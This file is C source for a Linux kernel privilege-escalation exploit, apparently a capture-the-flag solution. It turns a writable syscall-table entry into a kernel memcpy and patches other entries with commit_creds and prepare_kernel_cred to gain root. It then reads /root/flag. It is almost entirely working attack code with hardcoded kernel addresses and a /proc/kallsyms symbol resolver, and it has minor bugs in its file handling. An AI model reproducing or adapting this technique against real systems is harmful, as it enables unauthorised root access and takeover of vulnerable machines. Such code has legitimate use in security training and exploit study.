#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <sys/types.h>

#define SYS_CALL_TABLE 0x8000e348
#define NR_SYS_UNUSED 223
#define sys_read 0x800BEB34
#define pc_offset_7 28 // 7 is not implemented; 7*4=28
#define bss_start 0x804e3b20
#define text_start 0x80008000
#define SyS_execve 0x800c4bb0
#define sys_unlink 0x800cbf9c
#define sys_link_offset 36 // 9*4=36
#define memcpy_addr 0x8018fbe0
#define sys_upper_offset 892 // 223*4=892
#define pc_offset_13 52 // 13*4=52
#define pc_offset_11 44 // 11*4=44

/* thanks spender... */
unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	int ret;
	int rep = 0;
	int oldstyle = 0;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		oldstyle = 1;
	}

repeat:
	ret = 0;
	while(ret != EOF) {
		if (!oldstyle)
			ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		else {
			ret = fscanf(f, "%p %s\n", (void **)&addr, sname);
			if (ret == 2) {
				char *p;
				if (strstr(sname, "_O/") || strstr(sname, "_S."))
					continue;
				p = strrchr(sname, '_');
				if (p > ((char *)sname + 5) && !strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (p > (char *)sname && *(p - 1) == '_')
						p--;
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			fprintf(stdout, " [+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	if (rep)
		return 0;
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef int __attribute__((regparm(3))) (* _override_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
typedef int __attribute__((regparm(3))) (* _printk)(const char * message);
typedef unsigned long  __attribute__((regparm(3))) (* _cred_alloc_blank)(void);

_commit_creds commit_creds;
_override_creds override_creds;
_prepare_kernel_cred prepare_kernel_cred;
_printk printk;
_cred_alloc_blank cred_alloc_blank;

int main()
{
    char * test1 = (char *)malloc(400);
    char * test2 = (char *)malloc(400);
    unsigned int * temp;
    
    memset(test1, 0, 400);
    memset(test2, 0, 400);

    strncpy(test1, "[*] memcpy works", 400);
    
    // Make sys_upper() memcpy()
    temp = memcpy_addr;
    syscall(223, (char *)&temp, (char *)(unsigned int *)(SYS_CALL_TABLE+sys_upper_offset)); // override!
    syscall(223, test2, test1, 400);

    puts(test2);

    // Write address of commit_creds:
    commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
    temp = commit_creds;
    syscall(223, (unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (unsigned int *)&temp, 4);

    // Write address of prepare_kernel_cred
    prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");
    temp = prepare_kernel_cred;
    syscall(223, (unsigned int *)(SYS_CALL_TABLE+pc_offset_13), (unsigned int *)&temp, 4);

    syscall(7, syscall(13, 0));

    printf("[!] uid: %d \n", getuid());

    char * fname = "/root/flag";
    char * flag[500];
    int fp = open(fname, O_RDONLY);
    if(fp==NULL)
        printf("Error Occurred while Opening the File!\n");
    else
    {
        read(fp, flag, 100);
        printf("[!] FLAG: %s\n", flag);
    }
	fclose(fp);
}